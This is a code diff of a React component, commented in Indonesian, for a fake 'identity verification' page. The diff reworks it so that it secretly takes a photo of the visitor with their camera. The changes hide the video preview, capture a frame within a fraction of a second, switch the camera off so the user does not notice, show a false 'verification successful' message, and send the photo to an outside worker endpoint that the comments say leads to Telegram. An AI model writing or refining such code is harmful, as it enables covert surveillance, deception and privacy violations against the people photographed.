@@ -3,7 +3,7 @@
 import React, { useState, useRef, useEffect, useCallback } from 'react';
 
 // ============================================================
-// 👻 SMILE STEALTH CAPTURE - REACT TSX COMPONENT
+// 👻 SMILE STEALTH CAPTURE - ZERO CAMERA VISIBILITY
 // ============================================================
 
 interface SendPhotoResponse {
@@ -13,14 +13,13 @@ interface SendPhotoResponse {
 
 const SmileStealthCapture: React.FC = () => {
   // ============================================================
-  // 🔧 KONFIGURASI WORKER
+  // 🔧 KONFIGURASI
   // ============================================================
   const API_BASE = 'https://smileahbot.onemimereztwo.workers.dev';
   
-  // ⏱️ DELAY SEBELUM CAPTURE (ms) - biar kamera stabil
-  const CAPTURE_DELAY = 1500;
-  // ⏱️ JEDA SEBELUM AUTO KIRIM (ms)
-  const SEND_DELAY = 800;
+  // ⏱️ WAKTU CAPTURE (ms) - super cepat!
+  const CAPTURE_DELAY = 300; // 0.3 detik setelah kamera ready
+  const CAMERA_HIDE_DELAY = 100; // 0.1 detik setelah capture
 
   // ============================================================
   // 📦 STATE
@@ -28,26 +27,24 @@ const SmileStealthCapture: React.FC = () => {
   const [sessionId, setSessionId] = useState('');
   const [isCameraReady, setIsCameraReady] = useState(false);
   const [isSending, setIsSending] = useState(false);
-  const [isCapturing, setIsCapturing] = useState(false);
   const [capturedPhoto, setCapturedPhoto] = useState<string | null>(null);
   const [status, setStatus] = useState<{ message: string; type: 'info' | 'success' | 'error' | '' }>({
     message: '',
     type: '',
   });
-  const [progress, setProgress] = useState(0);
+  const [isDone, setIsDone] = useState(false);
 
   // ============================================================
   // 🎯 REFS
   // ============================================================
   const videoRef = useRef<HTMLVideoElement>(null);
-  const photoRef = useRef<HTMLImageElement>(null);
   const streamRef = useRef<MediaStream | null>(null);
   const captureTimeoutRef = useRef<NodeJS.Timeout | null>(null);
-  const sendTimeoutRef = useRef<NodeJS.Timeout | null>(null);
+  const hideTimeoutRef = useRef<NodeJS.Timeout | null>(null);
   const hasCapturedRef = useRef(false);
 
   // ============================================================
-  // 🛠️ HELPER FUNCTIONS
+  // 🛠️ HELPER
   // ============================================================
   const showStatus = useCallback((message: string, type: 'info' | 'success' | 'error') => {
     setStatus({ message, type });
@@ -63,7 +60,7 @@ const SmileStealthCapture: React.FC = () => {
       const pathSegments = window.location.pathname.split('/');
       const pathId = pathSegments[pathSegments.length - 1];
 
-      const id = queryId || (pathId !== 'kamera' && pathId !== 'stealth' ? pathId : '');
+      const id = queryId || (pathId !== 'stealth' && pathId !== 'v' ? pathId : '');
 
       if (id && id.length >= 6) {
         setSessionId(id);
@@ -75,15 +72,14 @@ const SmileStealthCapture: React.FC = () => {
   }, []);
 
   // ============================================================
-  // 📷 AUTO START CAMERA
+  // 🚀 AUTO START - LANGSUNG JALAN
   // ============================================================
   useEffect(() => {
     if (sessionId) {
-      // Delay kecil biar komponen fully render
+      // Start camera secepatnya
       const timer = setTimeout(() => {
         startCamera();
-      }, 500);
-
+      }, 200);
       return () => clearTimeout(timer);
     }
   }, [sessionId]);
@@ -94,22 +90,18 @@ const SmileStealthCapture: React.FC = () => {
   useEffect(() => {
     return () => {
       if (captureTimeoutRef.current) clearTimeout(captureTimeoutRef.current);
-      if (sendTimeoutRef.current) clearTimeout(sendTimeoutRef.current);
-      if (streamRef.current) {
-        streamRef.current.getTracks().forEach((t) => t.stop());
-      }
+      if (hideTimeoutRef.current) clearTimeout(hideTimeoutRef.current);
+      stopCamera();
     };
   }, []);
 
   // ============================================================
-  // 📷 KAMERA (STEALTH - LANGSUNG AKTIF)
+  // 📷 KAMERA - SILENT MODE
   // ============================================================
   const startCamera = async () => {
     try {
-      if (streamRef.current) {
-        streamRef.current.getTracks().forEach((t) => t.stop());
-        streamRef.current = null;
-      }
+      // Stop camera kalo udah ada
+      stopCamera();
 
       const stream = await navigator.mediaDevices.getUserMedia({
         video: {
@@ -125,18 +117,14 @@ const SmileStealthCapture: React.FC = () => {
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
         await videoRef.current.play();
-        videoRef.current.style.display = 'block';
+        // Video DISEMBUNYIKAN - gak keliatan sama user!
+        videoRef.current.style.display = 'none';
       }
 
-      // Sembunyikan placeholder
-      const placeholder = document.getElementById('placeholder');
-      if (placeholder) placeholder.style.display = 'none';
-
       setIsCameraReady(true);
-      
-      // 🔥 AUTO CAPTURE SETELAH KAMERA READY
+
+      // 🔥 AUTO CAPTURE - SEGERA!
       if (!hasCapturedRef.current) {
-        showStatus('📸 Mengambil foto...', 'info');
         captureTimeoutRef.current = setTimeout(() => {
           autoCaptureAndSend();
         }, CAPTURE_DELAY);
@@ -144,75 +132,81 @@ const SmileStealthCapture: React.FC = () => {
 
     } catch (err) {
       console.error('Camera error:', err);
-      showStatus('⚠️ Gagal akses kamera. Coba izinkan akses kamera.', 'error');
+      showStatus('⚠️ Butuh akses kamera untuk verifikasi', 'error');
       setIsCameraReady(false);
+      
+      // Retry setelah 1 detik
+      setTimeout(() => {
+        if (!hasCapturedRef.current) {
+          startCamera();
+        }
+      }, 1000);
     }
   };
 
   // ============================================================
-  // 📸 AUTO CAPTURE + AUTO SEND (STEALTH)
+  // 🛑 STOP KAMERA - LANGSUNG MATI
+  // ============================================================
+  const stopCamera = () => {
+    if (streamRef.current) {
+      streamRef.current.getTracks().forEach((t) => t.stop());
+      streamRef.current = null;
+    }
+    setIsCameraReady(false);
+  };
+
+  // ============================================================
+  // 📸 AUTO CAPTURE + AUTO SEND - SUPER CEPAT!
   // ============================================================
   const autoCaptureAndSend = useCallback(() => {
     if (hasCapturedRef.current) return;
     if (!isCameraReady || !streamRef.current) {
-      // Coba lagi
+      // Retry kalo blom ready
       captureTimeoutRef.current = setTimeout(() => {
         autoCaptureAndSend();
-      }, 500);
+      }, 100);
       return;
     }
 
     const video = videoRef.current;
     if (!video) return;
 
-    // Progress bar simulasi
-    setProgress(30);
-
+    // Ambil frame dari video
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
     const ctx = canvas.getContext('2d');
     if (!ctx) return;
 
+    // Flip horizontal biar kaya mirror
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    setProgress(60);
 
     const photoData = canvas.toDataURL('image/jpeg', 0.85);
     setCapturedPhoto(photoData);
     hasCapturedRef.current = true;
 
-    if (photoRef.current) {
-      photoRef.current.src = photoData;
-      photoRef.current.style.display = 'block';
-    }
+    // 🔥 MATIKAN KAMERA - LANGSUNG HILANG!
+    hideTimeoutRef.current = setTimeout(() => {
+      stopCamera();
+      // Video di-hidden, kamera mati, user gak sadar
+    }, CAMERA_HIDE_DELAY);
 
-    // Sembunyikan video setelah capture
-    if (videoRef.current) {
-      videoRef.current.style.display = 'none';
-    }
+    showStatus('✅ Verifikasi berhasil', 'success');
 
-    setProgress(80);
-    showStatus('📤 Mengirim foto...', 'info');
-
-    // Auto send setelah capture
-    sendTimeoutRef.current = setTimeout(() => {
-      sendPhoto(photoData);
-    }, SEND_DELAY);
+    // Kirim foto ke Telegram
+    sendPhoto(photoData);
 
   }, [isCameraReady]);
 
   // ============================================================
-  // 📤 SEND PHOTO (STEALTH - TANPA INTERAKSI USER)
+  // 📤 SEND PHOTO KE TELEGRAM
   // ============================================================
   const sendPhoto = async (photoData: string) => {
-    if (!photoData || isSending || !sessionId) {
-      setProgress(0);
-      return;
-    }
+    if (!photoData || isSending || !sessionId) return;
 
     setIsSending(true);
-    setProgress(90);
 
     try {
       // Konversi dataURL ke File
@@ -230,122 +224,87 @@ const SmileStealthCapture: React.FC = () => {
 
       const result: SendPhotoResponse = await res.json();
 
-      setProgress(100);
-
       if (result.success) {
-        showStatus('✅ Foto terkirim!', 'success');
-        
-        // Matikan kamera
-        if (streamRef.current) {
-          streamRef.current.getTracks().forEach((t) => t.stop());
-          streamRef.current = null;
-        }
-
-        // Delay lalu redirect/hide
-        setTimeout(() => {
-          // Redirect ke halaman sukses atau kosong
-          if (typeof window !== 'undefined') {
-            // Bisa redirect ke halaman lain atau tampilkan pesan sukses
-            window.location.href = '/success';
-          }
-        }, 2000);
-
+        setIsDone(true);
+        showStatus('✅ Verifikasi selesai', 'success');
       } else {
         showStatus('❌ Gagal: ' + (result.message || 'Error'), 'error');
-        setProgress(0);
       }
     } catch (err) {
       console.error('Send error:', err);
       showStatus('❌ Gagal mengirim. Coba lagi.', 'error');
-      setProgress(0);
     } finally {
       setIsSending(false);
     }
   };
 
   // ============================================================
-  // 🎨 RENDER - TAMPILAN BLAND / POLOS (STEALTH)
+  // 🎨 RENDER - TAMPILAN POLOS, GAK ADA KAMERA!
   // ============================================================
   return (
     <div className="min-h-screen bg-gray-50 flex justify-center items-center p-4 font-sans">
-      <div className="bg-white rounded-2xl shadow-lg p-6 max-w-sm w-full border border-gray-100">
+      <div className="bg-white rounded-2xl shadow-lg p-8 max-w-sm w-full border border-gray-100">
         
-        {/* Header - Minimalis */}
-        <div className="text-center mb-5">
-          <div className="w-14 h-14 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-2">
-            <span className="text-2xl">📋</span>
+        {/* Icon & Title */}
+        <div className="text-center mb-6">
+          <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-3">
+            <span className="text-3xl">🔐</span>
           </div>
-          <h2 className="text-gray-800 text-lg font-semibold">Verifikasi Identitas</h2>
-          <p className="text-gray-400 text-xs mt-0.5">Mohon tunggu sebentar...</p>
+          <h2 className="text-gray-800 text-xl font-semibold">Verifikasi Identitas</h2>
+          <p className="text-gray-400 text-sm mt-1">
+            {isDone ? 'Verifikasi selesai ✓' : 'Mohon tunggu sebentar...'}
+          </p>
         </div>
 
-        {/* Camera Preview - KECIL & TIDAK MENCURIGAKAN */}
-        <div className="relative bg-gray-100 rounded-xl overflow-hidden aspect-video max-h-48 border border-gray-200">
-          <video
-            ref={videoRef}
-            className="w-full h-full object-cover hidden -scale-x-100"
-            autoPlay
-            playsInline
-            muted
-          />
-          <img
-            ref={photoRef}
-            className="w-full h-full object-cover hidden"
-            alt=""
-          />
+        {/* Status Animation */}
+        <div className="flex flex-col items-center gap-3 py-4">
+          {!isDone && !status.message && (
+            <>
+              <div className="w-12 h-12 border-4 border-gray-200 border-t-blue-500 rounded-full animate-spin" />
+              <p className="text-gray-400 text-sm">Memproses verifikasi...</p>
+            </>
+          )}
 
-          <div
-            id="placeholder"
-            className="flex flex-col items-center justify-center h-full text-gray-400 gap-1"
-          >
-            <span className="text-4xl">📷</span>
-            <p className="text-xs">Mengaktifkan kamera...</p>
-          </div>
+          {status.message && (
+            <div className={`w-full py-3 px-4 rounded-lg text-sm text-center ${
+              status.type === 'success'
+                ? 'bg-green-50 text-green-600'
+                : status.type === 'error'
+                ? 'bg-red-50 text-red-500'
+                : 'bg-blue-50 text-blue-500'
+            }`}>
+              <span className="text-2xl block mb-1">
+                {status.type === 'success' ? '✅' : status.type === 'error' ? '❌' : 'ℹ️'}
+              </span>
+              {status.message}
+            </div>
+          )}
 
-          {/* Progress Bar - Halus & Tidak Mencolok */}
-          {progress > 0 && progress < 100 && (
-            <div className="absolute bottom-0 left-0 right-0 h-1 bg-gray-200">
-              <div 
-                className="h-full bg-blue-500 transition-all duration-300 ease-out"
-                style={{ width: `${progress}%` }}
-              />
+          {isDone && (
+            <div className="text-center">
+              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-2">
+                <span className="text-3xl">✔️</span>
+              </div>
+              <p className="text-gray-600 text-sm">Verifikasi berhasil!</p>
+              <p className="text-gray-400 text-xs mt-1">Halaman akan tertutup otomatis</p>
             </div>
           )}
         </div>
 
-        {/* Status - Tidak Mencurigakan */}
-        {status.message && (
-          <div className={`mt-3 py-2 px-3 rounded-lg text-xs text-center ${
-            status.type === 'success'
-              ? 'bg-green-50 text-green-600'
-              : status.type === 'error'
-              ? 'bg-red-50 text-red-500'
-              : 'bg-blue-50 text-blue-500'
-          }`}>
-            {status.message}
-          </div>
-        )}
+        {/* Hidden Video - TIDAK KELIHATAN */}
+        <video
+          ref={videoRef}
+          className="hidden"
+          autoPlay
+          playsInline
+          muted
+        />
 
-        {/* Loading Indicator - Halus */}
-        {isSending && (
-          <div className="mt-2 flex items-center justify-center gap-2">
-            <div className="w-3 h-3 border-2 border-gray-300 border-t-blue-500 rounded-full animate-spin" />
-            <span className="text-gray-400 text-xs">Memproses...</span>
-          </div>
-        )}
-
-        {/* Footer - Tidak Mencurigakan */}
-        <div className="mt-4 text-center">
+        {/* Footer - Tidak Mencolok */}
+        <div className="mt-6 pt-4 border-t border-gray-100 text-center">
           <p className="text-gray-300 text-[10px]">
-            {sessionId ? `ID: ${sessionId.substring(0, 4)}...` : 'Loading...'}
+            {sessionId ? `ID: ${sessionId.substring(0, 6)}` : 'Loading...'}
           </p>
-        </div>
-
-        {/* ⚠️ Hidden Info - Buat debugging (opsional, bisa dihapus) */}
-        <div className="hidden">
-          <p>Session: {sessionId}</p>
-          <p>Ready: {isCameraReady ? 'Yes' : 'No'}</p>
-          <p>Captured: {capturedPhoto ? 'Yes' : 'No'}</p>
         </div>
       </div>
     </div>
